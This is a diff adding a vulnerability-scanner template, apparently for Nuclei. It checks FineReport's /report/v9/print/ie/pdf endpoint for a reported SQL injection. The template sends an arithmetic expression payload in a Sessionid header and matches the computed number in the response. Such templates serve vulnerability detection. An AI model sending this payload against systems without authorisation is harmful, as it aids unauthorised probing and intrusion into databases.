@@ -1,0 +1,30 @@
+id: finereport-v9-print-ie-pdf-sqli
+
+info:
+  name: 帆软报表 /report/v9/print/ie/pdf SQL注入漏洞
+  author: bl
+  severity: high
+  description: |
+    SQL注入漏洞是指攻击者通过在Web应用程序的输入字段中插入恶意SQL代码，从而绕过应用程序的安全措施，直接对数据库执行非法操作。这种漏洞通常发生在应用程序未对用户输入进行充分验证和过滤的情况下，使得攻击者能够获取、修改或删除数据库中的数据，甚至可能执行服务器上的任意代码。
+  reference:
+    - https://blog.csdn.net/qq_32034221/article/details/149546344
+  classification:
+    cwe-id: CWE-89
+  tags: 帆软-FineReport
+
+http:
+  - raw:
+      - |
+        GET /webroot/decision/nx/report/v9/print/ie/pdf HTTP/1.1
+        Host: {{Hostname}}
+        Sessionid: ${149698566 - 17877}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+    
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "149680689"
+      - type: status
+        status:
+          - 200
